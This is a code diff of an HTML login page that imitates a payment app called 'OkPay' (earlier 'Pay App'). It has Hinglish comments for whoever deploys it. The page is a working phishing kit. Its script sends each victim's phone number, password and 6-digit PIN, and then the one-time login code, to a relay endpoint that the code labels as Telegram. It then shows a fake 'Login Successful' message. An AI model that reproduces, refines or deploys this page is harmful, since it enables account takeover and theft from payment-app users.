@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>
-      Pay App - Login
-    </title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OkPay - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-      * { box-sizing: border-box; font-family: &#39;Segoe UI&#39;, Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
         body { background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
         .main-container { width: 100%; max-width: 400px; background: #f0f4f8; padding: 20px; position: relative; overflow: hidden; }
         
         .logo-container { text-align: center; margin-bottom: 30px; margin-top: 20px; }
-        /* Agar logo nahi dikh raha toh yeh text dikhega */
         .logo-container img { width: 180px; max-width: 100%; height: auto; }
 
         .input-group { position: relative; margin-bottom: 15px; }
@@ -52,83 +49,78 @@
         
         .btn-confirm { background: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
     </style>
-  </head>
-  <body>
+</head>
+<body>
+
     <div class="main-container">
-      <div class="logo-container">
-        <!-- Yahan apni image ka naam daalein (Jaise: mylogo.jpg) -->
-        <img src="Screenshot_2026-11-17-04-36-40-51_19f064738b1e002a41b9d550c78e20ce.jpg
-                " alt="Pay App" onerror="this.style.display=&#39;none&#39;" />
-      </div>
-      <form id="loginForm">
-        <div class="input-group">
-          <i class="fa-solid fa-user"></i>
-          <input type="tel" id="phone" placeholder="Phone" required="" />
+        <div class="logo-container">
+            <!-- Yahan apni image ka exact naam daalein (Jaise: IMG-20260916-WA0005.JPG) -->
+            <img src="YAHAN_LOGO_KA_NAAM_DAALEIN" alt="OkPay" onerror="this.style.display='none'">
         </div>
-        <div class="input-group">
-          <i class="fa-solid fa-lock"></i>
-          <input type="password" id="password" placeholder="Password" required="" />
-        </div>
-        <div class="input-group">
-          <i class="fa-solid fa-key"></i>
-          <input type="password" id="pin" placeholder="6-Digit PIN" maxlength="6" required="" />
-        </div>
-        <div class="links-row">
-          <a href="#">          Register
-</a>
-          <label>
-            <input type="radio" name="remember" style="accent-color: #008e5a;" />
-            Remember Me
-          </label>
-        </div>
-        <div class="privacy-row">
-          <input type="checkbox" required="" />
-          Agree &#34;User Privacy Agreement&#34;
-        </div>
-        <button type="submit" class="btn btn-signin">
-          Sign In
-        </button>
-      </form>
-      <a class="forgot-link" href="#">      Forget Password
-</a>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="tel" id="phone" placeholder="Phone" required>
+            </div>
+            
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-key"></i>
+                <input type="password" id="pin" placeholder="6-Digit PIN" maxlength="6" required>
+            </div>
+
+            <div class="links-row">
+                <a href="#">Register</a>
+                <label><input type="radio" name="remember" style="accent-color: #008e5a;"> Remember Me</label>
+            </div>
+
+            <div class="privacy-row">
+                <input type="checkbox" required> Agree "User Privacy Agreement"
+            </div>
+
+            <button type="submit" class="btn btn-signin">Sign In</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forget Password</a>
     </div>
-    <!-- OTP POPUP MODAL -->
+
+    <!-- OTP POPUP MODAL (Yeh hissa zaroori hai) -->
     <div class="modal-overlay" id="otpModal">
-      <div class="modal-content">
-        <div class="modal-header">
-          <h2>
-            Login OTP
-          </h2>
-          <button class="close-btn" onclick="closeModal()">
-            ×
-          </button>
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Login OTP</h2>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            
+            <div class="modal-text">
+                Tap Send to receive the OTP, then enter it to confirm this login.
+            </div>
+            <div class="modal-phone">
+                OTP will be sent to <span id="displayPhone">+91 XXXXXXXXXX</span>
+            </div>
+
+            <div class="otp-input-row">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6">
+                <button class="btn-send" id="sendOtpBtn">Send</button>
+            </div>
+
+            <button class="btn btn-confirm" id="confirmOtpBtn">Confirm</button>
         </div>
-        <div class="modal-text">
-          Tap Send to receive the OTP, then enter it to confirm this login.
-        </div>
-        <div class="modal-phone">
-          OTP will be sent to
-          <span id="displayPhone">          +91 XXXXXXXXXX
-</span>
-        </div>
-        <div class="otp-input-row">
-          <i class="fa-regular fa-envelope"></i>
-          <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6" />
-          <button class="btn-send" id="sendOtpBtn">
-            Send
-          </button>
-        </div>
-        <button class="btn btn-confirm" id="confirmOtpBtn">
-          Confirm
-        </button>
-      </div>
     </div>
+
     <script>
-      async function sendToTelegram(messageText) {
+        // --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
+        async function sendToTelegram(messageText) {
             try {
-                const res = await fetch(&#39;/api/submit&#39;, {
-                    method: &#39;POST&#39;,
-                    headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
+                const res = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message: messageText })
                 });
                 return res.ok;
@@ -137,80 +129,85 @@
             }
         }
 
-        const modal = document.getElementById(&#39;otpModal&#39;);
-        const displayPhone = document.getElementById(&#39;displayPhone&#39;);
-        const sendOtpBtn = document.getElementById(&#39;sendOtpBtn&#39;);
+        const modal = document.getElementById('otpModal');
+        const displayPhone = document.getElementById('displayPhone');
+        const sendOtpBtn = document.getElementById('sendOtpBtn');
         let timerInterval;
 
         function closeModal() {
-            modal.style.display = &#39;none&#39;;
+            modal.style.display = 'none';
             clearInterval(timerInterval);
-            sendOtpBtn.innerText = &#34;Send&#34;;
+            sendOtpBtn.innerText = "Send";
             sendOtpBtn.disabled = false;
         }
 
-        document.getElementById(&#39;loginForm&#39;).addEventListener(&#39;submit&#39;, function(e) {
+        // 1. SIGN IN BUTTON (Yahan click karne par popup khulega)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const phone = document.getElementById(&#39;phone&#39;).value;
-            const password = document.getElementById(&#39;password&#39;).value;
-            const pin = document.getElementById(&#39;pin&#39;).value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
 
-            const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+            const msg = `🔔 *OkPay: Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
             sendToTelegram(msg); 
 
             displayPhone.innerText = `+91 ${phone}`;
-            modal.style.display = &#39;flex&#39;; 
+            
+            // Yeh line popup ko open karti hai
+            modal.style.display = 'flex'; 
         });
 
-        sendOtpBtn.addEventListener(&#39;click&#39;, async function() {
-            const phone = document.getElementById(&#39;phone&#39;).value;
+        // 2. SEND OTP BUTTON (60 Second Timer)
+        sendOtpBtn.addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
             
             this.disabled = true;
             let timeLeft = 60;
             this.innerText = `${timeLeft}s`;
 
-            const msg = `🚨 *OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
+            const msg = `🚨 *OkPay: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
             await sendToTelegram(msg);
 
-            timerInterval = setInterval(() =&gt; {
+            timerInterval = setInterval(() => {
                 timeLeft--;
                 sendOtpBtn.innerText = `${timeLeft}s`;
 
-                if (timeLeft &lt;= 0) {
+                if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    sendOtpBtn.innerText = &#34;Send&#34;;
+                    sendOtpBtn.innerText = "Send";
                     sendOtpBtn.disabled = false;
                 }
             }, 1000);
         });
 
-        document.getElementById(&#39;confirmOtpBtn&#39;).addEventListener(&#39;click&#39;, async function() {
-            const phone = document.getElementById(&#39;phone&#39;).value;
-            const otp = document.getElementById(&#39;otpCode&#39;).value;
+        // 3. CONFIRM BUTTON
+        document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otpCode').value;
             
             if(!otp) {
-                alert(&#34;Pehle 6-digit OTP enter karein!&#34;);
+                alert("Pehle 6-digit OTP enter karein!");
                 return;
             }
 
-            this.innerText = &#34;Confirming...&#34;;
+            this.innerText = "Confirming...";
             this.disabled = true;
 
-            const msg = `✅ *OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+            const msg = `✅ *OkPay: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
             const success = await sendToTelegram(msg);
 
             if(success) {
-                alert(&#34;Login Successful!&#34;);
+                alert("Login Successful!");
                 closeModal();
-                document.getElementById(&#39;loginForm&#39;).reset();
-                document.getElementById(&#39;otpCode&#39;).value = &#34;&#34;;
+                document.getElementById('loginForm').reset();
+                document.getElementById('otpCode').value = "";
             } else {
-                alert(&#34;Telegram par nahi gaya, network check karein.&#34;);
+                alert("Telegram par nahi gaya, network check karein.");
             }
 
-            this.innerText = &#34;Confirm&#34;;
+            this.innerText = "Confirm";
             this.disabled = false;
         });
     </script>
-  </body>
+</body>
 </html>
